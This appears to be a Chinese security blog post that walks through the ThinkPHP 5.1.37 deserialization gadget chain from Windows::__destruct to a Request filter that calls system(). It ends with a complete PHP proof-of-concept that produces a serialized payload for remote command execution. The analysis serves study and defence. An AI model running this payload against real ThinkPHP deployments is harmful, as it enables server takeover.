---
title: "PHP反序列化——ThinkPHP5.1.37反序列化链路构造"
description: "ThinkPHP 5.1.37 反序列化链路构造分析。"
publishDate: "2025-09-22T00:00:00+08:00"
ogImage: "https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/0df31c475c0bdfdc371dbfa6f0fbe139.jpeg"
categories: ["PHP Security"]
tags: ["php", "反序列化", "thinkphp"]
---
本文转载于https://xz.aliyun.com/news/6223#toc-2，跟着师傅的文章分析

## 前置知识

* [PHP中的namespace命名空间](https://1cfh.fun/2025/01/21/WebExploit/Php/%E5%9B%9E%E6%9C%9B-ThinkPHP%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/)

* trait修饰符

Trait 是 PHP 5.4+ 引入的一种代码复用机制，它允许开发者在不同类之间复用方法集合，同时避免了单继承的限制

trait这个东西的出现是为了解决php不支持多继承的问题，一般我们将一些类的公有特性提取出来写成一个trait,然后如果某个类想要使用trait中的东西，只需要使用use关键字把这个trait包含进来就行了

```plain text
trait MyTrait {
    public function traitMethod() {
        echo "Trait method called";
    }
}

class MyClass {
    use MyTrait;
}

$obj = new MyClass();
$obj->traitMethod(); // 输出: Trait method called
```

## 反序列化链路分析

* 反序列化的入口点

\_\_wakeup&#x20;

\_\_destruct&#x20;



这里找到thinkphp/library/think/process/pipes/Windows.php

![](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/b9cf7645f02b642540ae99aee64145e6.png)

&#x20;    跟进removefiles()

```bash
private function removeFiles()
{
    foreach ($this->files as $filename) {
        if (file_exists($filename)) {
            @unlink($filename);
        }
    }
    $this->files = [];
}
```

调用了file\_exists（）函数，函数参数$filename在这里当作string类型处理，因此这里会调用\_tostring()魔术方法。

全局搜索\_tostring方法

![](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/737b0925f340fd63089a55acdf899066.png)

跟进thinkphp/library/think/Collection.php中，

```plain text
public function toJson($options = JSON_UNESCAPED_UNICODE)
{
    return json_encode($this->toArray(), $options);
}

public function __toString()
{
    return $this->toJson();
}
```

继续跟进ToJson方法，json\_encode($this->toArray(), $options);调用了toArray方法。

在该方法中找到$可控变量->方法(参数可控)这样一个利用点

```plain text
$relation->visible($name);
```

![](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/9ebf89250d3b28feb46e59adb8443512.png)

其中$relation要可控，visible方法在$relation类中不存在，这样才能去调用$relation类的\_call魔术方法，$name参数也要可控，tips这里的name参数是一个数组。

```bash
$relation = $this->getRelation($key);

if (!$relation) {
    $relation = $this->getAttr($key);
    if ($relation) {
        $relation->visible($name);
    }
}
```

分析$relation变量，跟进$this->getRelation($key);方法，返回为空

```bash
public function getRelation($name = null)
{
    if (is_null($name)) {
        return $this->relation;
    } elseif (array_key_exists($name, $this->relation)) {
        return $this->relation[$name];
    }
    return;
}
```

进入if分分支，接着分析$relation = $this->getAttr($key);



```bash
public function getAttr($name, &$item = null)  //$name = $key = 'lin'
{
    try {
        $notFound = false;
        $value    = $this->getData($name);
    } catch (InvalidArgumentException $e) {
        $notFound = true;
        $value    = null;
    }

    // 检测属性获取器
    $fieldName = Loader::parseName($name);
    $method    = 'get' . Loader::parseName($name, 1) . 'Attr';

    if (isset($this->withAttr[$fieldName])) {
        if ($notFound && $relation = $this->isRelationAttr($name)) {
            $modelRelation = $this->$relation();
            $value         = $this->getRelationData($modelRelation);
        }

        $closure = $this->withAttr[$fieldName];
        $value   = $closure($value, $this->data);
    } elseif (method_exists($this, $method)) {
        if ($notFound && $relation = $this->isRelationAttr($name)) {
            $modelRelation = $this->$relation();
            $value         = $this->getRelationData($modelRelation);
        }

        $value = $this->$method($value, $this->data);
    } elseif (isset($this->type[$name])) {
        // 类型转换
        $value = $this->readTransform($value, $this->type[$name]);
    } elseif ($this->autoWriteTimestamp && in_array($name, [$this->createTime, $this->updateTime])) {
        if (is_string($this->autoWriteTimestamp) && in_array(strtolower($this->autoWriteTimestamp), [
            'datetime',
            'date',
            'timestamp',
        ])) {
            $value = $this->formatDateTime($this->dateFormat, $value);
        } else {
            $value = $this->formatDateTime($this->dateFormat, $value, true);
        }
    } elseif ($notFound) {
        $value = $this->getRelationAttribute($name, $item);
    }

    return $value;
}
```

这里进一步调用$value    = $this->getData($name);，进入到getData($name)函数，

```php
public function getData($name = null) //$name = $key = 'lin'
{
    if (is_null($name)) {
        return $this->data;
    } elseif (array_key_exists($name, $this->data)) { //查找$name是否为data数组里的键名，因为data可控，在poc里定义为$this->data = ["lin"=>new Request()]; 所以存在
        return $this->data[$name];  //返回结果为new Request()
    } elseif (array_key_exists($name, $this->relation)) {
        return $this->relation[$name];
    }
    throw new InvalidArgumentException('property not exists:' . static::class . '->' . $name);
}
```

所以向上返回到toArray函数，`$relation`的值为`$this->data[$name]`，`$this->data[$name]`为任意类的实例化对象，即new Request()。具体如下：

```php
public function toArray(){
    ……
    if (!$relation) {
    $relation = $this->getAttr($key);
    if ($relation) {
        $relation->visible($name); //new Request()-> visible($name) ,$name = ["calc.exe","calc"] 
    ……
}

}
```

此处，https://xz.aliyun.com/news/6223#toc-2



下面我们需要寻找一个类满足以下2个条件

1.该类中没有”visible”方法

2.实现了\_\_call方法

直接查找 “public function \_\_call”

一般PHP中的\_\_call方法都是用来进行容错或者是动态调用,所以一般会在\_\_call方法中使用

\_\_call\_user\_func($method, $args)

\_\_call\_user\_func\_array(\[$obj,$method], $args)
但是 public function \_\_call($method, $args) 我们只能控制 $args,所以很多类都不可以用
经过查找发现 thinkphp/library/think/Request.php 中的 \_\_call 使用了一个array取值的

```php
public function __call($method, $args)//$method=visable, $args=["calc.exe","calc"] 
{
    if (array_key_exists($method, $this->hook)) {//$this->hook可控
        array_unshift($args, $this);
        return call_user_func_array($this->hook[$method], $args); 
    }

    throw new Exception('method not exists:' . static::class . '->' . $method);
}
```

1. 检查钩子是否存在：检查`$this->hook`数组中是否存在以`$method`为键的条目

2. 准备参数：使用`array_unshift($args, $this)`将当前对象实例`$this`插入参数数组的开头

3. 动态调用：使用`call_user_func_array()`调用存储在hook中的回调函数

这里 $this->hook可控，所以要在这里构造$hook= {“visable”=>”任意method”}



最后调用情况

```bash
call_user_func_array([$obj,"任意方法"],[$this,任意参数])
也就是
$obj->$func($this,$argv)
```

Request类中有一个特殊的功能就是过滤器 filter，该方法存在命令执行函数，所以可以尝试覆盖filter的方法去执行代码

找到函数`private function filterValue(&$value, $key, $filters)`，但是没法直接利用，参数不可控，向上寻找调用

![](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/4ea56ed759247c8ca4fdbb342bdf5821.png)

寻找使用了过滤器的所有方法，发现input()函数

```bash
    public function input($data = [], $name = '', $default = null, $filter = '')
    {
        if (false === $name) {
            // 获取原始数据
            return $data;
        }

        $name = (string) $name;
        if ('' != $name) {
            // 解析name
            if (strpos($name, '/')) {
                list($name, $type) = explode('/', $name);
            }

            $data = $this->getData($data, $name);

            if (is_null($data)) {
                return $default;
            }

            if (is_object($data)) {
                return $data;
            }
        }

        // 解析过滤器
        $filter = $this->getFilter($filter, $default);

        if (is_array($data)) {
            array_walk_recursive($data, [$this, 'filterValue'], $filter);
            if (version_compare(PHP_VERSION, '7.1.0', '<')) {
                // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针
                $this->arrayReset($data);
            }
        } else {
            $this->filterValue($data, $name, $filter);
        }

        if (isset($type) && $data !== $default) {
            // 强制类型转换
            $this->typeCast($data, $type);
        }

        return $data;
    }

```

这里input函数的控制点也不好构造，继续查找调用input方法的的函数

![](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/2a57c52777c5ad88901e1f3757ae7f95.png)

找到param函数调用了input函数

```php
public function param($name = '', $default = null, $filter = '')
{
    if (!$this->mergeParam) {
        $method = $this->method(true);

        // 自动获取请求变量
        switch ($method) {
            case 'POST':
                $vars = $this->post(false);
                break;
            case 'PUT':
            case 'DELETE':
            case 'PATCH':
                $vars = $this->put(false);
                break;
            default:
                $vars = [];
        }

        // 当前请求参数和URL地址中的参数合并
        $this->param = array_merge($this->param, $this->get(false), $vars, $this->route(false));

        $this->mergeParam = true;
    }

    if (true === $name) {
        // 获取包含文件上传信息的数组
        $file = $this->file();
        $data = is_array($file) ? array_merge($this->param, $file) : $this->param;

        return $this->input($data, '', $default, $filter);
    }

    return $this->input($this->param, $name, $default, $filter);
}
```

不过参数仍然是不可控的，所以我们继续找调用param函数的地方。找到了isAjax函数

![](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/ad763e7432ca9435717ae85cd5e58fbf.png)



```php
public function isAjax($ajax = false)
{
    $value  = $this->server('HTTP_X_REQUESTED_WITH');
    $result = 'xmlhttprequest' == strtolower($value) ? true : false;

    if (true === $ajax) {
        return $result;
    }

    $result           = $this->param($this->config['var_ajax']) ? true : $result;
    $this->mergeParam = false;
    return $result;
}
```

在isAjax函数中，我们可以控制`$this->config['var_ajax']`，`$this->config['var_ajax']`可控就意味着param函数中的`$name`可控，



OK，这里回溯到input（）函数，`$name`的值来自于`$this->config['var_ajax']`，这里先分析一下$data = $this->getData($data, $name);和$filter = $this->getFilter($filter, $default);函数

![](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/38eed6f9e716157c30f38080363914e5.png)

$data = $this->getData($data, $name);

```php
protected function getData(array $data, $name)  //name=$this->config['var_ajax']
```

这里`$data` = `$data[$val]` = `$data[$name]`



$filter = $this->getFilter($filter, $default);

```php
protected function getFilter($filter, $default)
{
    if (is_null($filter)) {
        $filter = [];
    } else {
        $filter = $filter ?: $this->filter; //$filter来自于$this->filter
        if (is_string($filter) && false === strpos($filter, '/')) {
            $filter = explode(',', $filter);
        } else {
            $filter = (array) $filter;
        }
    }

    $filter[] = $default;

    return $filter;
}
```



这里的`$filter`来自于`$this->filter`，我们需要定义一个带有`$this->filter`的函数



![](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/5a3e6e4c25668073df942e0bb4b0540b.png)

* [ ] tip：对于上面这张图这个细节点，我还没get到





## 梳理一下整个调用链路

toArray()方法创建了一个Request()对象，然后会触发poc里的`__construct()`方法，接着`new Request()-> visible($name)`，该对象调用了一个不存在的方法会触发`__call`方法，看一下`__construct()`方法内容：

```php
function __construct(){        
    $this->filter = "system";        
    $this->config = ["var_ajax"=>'lin'];        
    $this->hook = ["visible"=>[$this,"isAjax"]];    
}
```





```bash
public function __call($method, $args) //method =visable ,args is array。//$method为不存在方法，$args为不存在方法以数组形式存的参数，此时$method = visible，$args = $name = ["calc.exe","calc"]
{
    if (array_key_exists($method, $this->hook)) {
        array_unshift($args, $this);//将新元素插入到数组$args中，此时$args = [$this,"calc.exe","calc"]
        return call_user_func_array($this->hook[$method], $args); //执行回调函数isAjax, ([$this,isAjax],[$this,"calc.exe","calc"])
    }

    throw new Exception('method not exists:' . static::class . '->' . $method);
}
```

接着看isAjax方法的调用过程，

```php
public function isAjax($ajax = false)
{
    $value  = $this->server('HTTP_X_REQUESTED_WITH');
    $result = 'xmlhttprequest' == strtolower($value) ? true : false;

    if (true === $ajax) {
        return $result;
    }

    $result           = $this->param($this->config['var_ajax']) ? true : $result;//这里$this->config['var_ajax'] = 'lin'
    $this->mergeParam = false;
    return $result;
}
```

进入param（）方法



```php
/*
* 获取当前请求的参数
* @access public
* @param  mixed         $name 变量名
* @param  mixed         $default 默认值
* @param  string|array  $filter 过滤方法
* @return mixed
*/
public function param($name = '', $default = null, $filter = '')//$name = $this->config['var_ajax'] = 'lin'
{
    if (!$this->mergeParam) {
        $method = $this->method(true);

        // 自动获取请求变量
        switch ($method) {
            case 'POST':
                $vars = $this->post(false);
                break;
            case 'PUT':
            case 'DELETE':
            case 'PATCH':
                $vars = $this->put(false);
                break;
            default:
                $vars = [];
        }

        // 当前请求参数和URL地址中的参数合并
        $this->param = array_merge($this->param, $this->get(false), $vars, $this->route(false));

        $this->mergeParam = true;
    }

    if (true === $name) {
        // 获取包含文件上传信息的数组
        $file = $this->file();
        $data = is_array($file) ? array_merge($this->param, $file) : $this->param;

        return $this->input($data, '', $default, $filter);
    }

    return $this->input($this->param, $name, $default, $filter);//$this->param当前get请求参数数组('lin' => 'calc')、$name = $this->config['var_ajax'] = lin
}
```

分析input()方法

```php
/**
 * 获取变量 支持过滤和默认值
 * @access public
 * @param  array         $data 数据源
 * @param  string|false  $name 字段名
 * @param  mixed         $default 默认值
 * @param  string|array  $filter 过滤函数
 * @return mixed
 */
public function input($data = [], $name = '', $default = null, $filter = '')
{////当前请求参数数组'lin'=>'calc'、$name = $this->config['var_ajax']=lin
    if (false === $name) {
        // 获取原始数据
        return $data;
    }

    $name = (string) $name;//指定lin为字符串
    if ('' != $name) {
        // 解析name
        if (strpos($name, '/')) {
            list($name, $type) = explode('/', $name);
        }

        $data = $this->getData($data, $name);//$data = $data[$val] = $data['lin'] = calc

        if (is_null($data)) {
            return $default;
        }

        if (is_object($data)) {
            return $data;
        }
    }

    // 解析过滤器
    $filter = $this->getFilter($filter, $default);//$filter[0=>'system',1=>$default]  ，这里先跟进该函数

    if (is_array($data)) {
        array_walk_recursive($data, [$this, 'filterValue'], $filter);
        //这块还没get到
        ////回调函数filterValue ，跟进该函数，$data = filterValue.$value = calc 、 $filter = filterValue.$filters = [0->system,1->$default] 、 $name = filterValue.$key = 'lin'
        if (version_compare(PHP_VERSION, '7.1.0', '<')) {
            // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针
            $this->arrayReset($data);
        }
    } else {
        $this->filterValue($data, $name, $filter); //$data , $filter
    }

    if (isset($type) && $data !== $default) {
        // 强制类型转换
        $this->typeCast($data, $type);
    }

    return $data;
}
```

$data = $this->getData($data, $name);

```php
protected function getData(array $data, $name)  //$data['lin'=>'calc'],$name = 'lin'
{
    foreach (explode('.', $name) as $val) {//分割成数组['lin']
        if (isset($data[$val])) {
            $data = $data[$val];// 此时$data = $data['lin'] = 'calc' ,回到上面input()
        } else {
            return;
        }
    }

    return $data;
}
```

这里`$data` = `$data[$val]` = `$data[$name]`



$filter = $this->getFilter($filter, $default);

```php
protected function getFilter($filter, $default)//$filter在poc里定义为system
{
    if (is_null($filter)) {
        $filter = [];
    } else {
        $filter = $filter ?: $this->filter; //$filter = $this->filter = system
        if (is_string($filter) && false === strpos($filter, '/')) {
            $filter = explode(',', $filter);
        } else {
            $filter = (array) $filter;
        }
    }

    $filter[] = $default;//此时$filter[]为{ [0]=>"system" [1]=>$default }，回到上面Input()

    return $filter;
}
```

进入到filterValue函数

```php
/**
 * 递归过滤给定的值
 * @access public
 * @param  mixed     $value 键值
 * @param  mixed     $key 键名
 * @param  array     $filters 过滤方法+默认值
 * @return mixed
 */
private function filterValue(&$value, $key, $filters)
{
    $default = array_pop($filters);//删除数组最后一个元素，此时$filters=$filter[0]=system

    foreach ($filters as $filter) {
        if (is_callable($filter)) {//验证变量名能否作为函数调用，system()
            // 调用函数或者方法过滤
            $value = call_user_func($filter, $value); //执行回调函数system('calc');
        } elseif (is_scalar($value)) {
            if (false !== strpos($filter, '/')) {
                // 正则过滤
                if (!preg_match($filter, $value)) {
                    // 匹配不成功返回默认值
                    $value = $default;
                    break;
                }
            } elseif (!empty($filter)) {
                // filter函数不存在时, 则使用filter_var进行过滤
                // filter为非整形值时, 调用filter_id取得过滤id
                $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));
                if (false === $value) {
                    $value = $default;
                    break;
                }
            }
        }
    }

    return $value;
}
```

## 利用链路

![](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/dfd24bae8e9469289924262c37f8c36a.png)

## POC

```php
<?php
namespace think;
abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        $this->append = ["lin"=>["calc.exe","calc"]];
        $this->data = ["lin"=>new Request()];
    }
}
class Request
{
    protected $hook = [];
    protected $filter = "system";
    protected $config = [
        // 表单ajax伪装变量
        'var_ajax'         => '_ajax',
    ];
    function __construct(){
        $this->filter = "system";
        $this->config = ["var_ajax"=>'lin'];
        $this->hook = ["visible"=>[$this,"isAjax"]];
    }
}


namespace think\process\pipes;

use think\model\concern\Conversion;
use think\model\Pivot;
class Windows
{
    private $files = [];

    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}
namespace think\model;

use think\Model;

class Pivot extends Model
{
}
use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
?>
```

结语：

基于现有学识，本文可能存在诸多错误，网上关于thinkphp5反序列化利用连文章很多，推荐更多看看大佬们的文章。小tips：许多文章真的难评，写的缺乏逻辑性，反而很绕……

## Reference:

[如何在Ubuntu环境下高效部署ThinkPHP5框架进行Web开发](https://www.oryoy.com/news/ru-he-zai-ubuntu-huan-jing-xia-gao-xiao-bu-shu-thinkphp5-kuang-jia-jin-xing-web-kai-fa.html)

https://juejin.cn/post/6854573211267366926

https://saofeia.github.io/2024/10/10/Thinkphp5.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96ajax%E9%93%BE/

https://www.cnblogs.com/starme/p/18467006

https://xz.aliyun.com/news/6223#toc-2

https://www.freebuf.com/vuls/263977.html

https://www.cnblogs.com/th0r/p/14653223.html

https://www.cnblogs.com/th0r/p/14653223.html

https://www.freebuf.com/vuls/317886.html

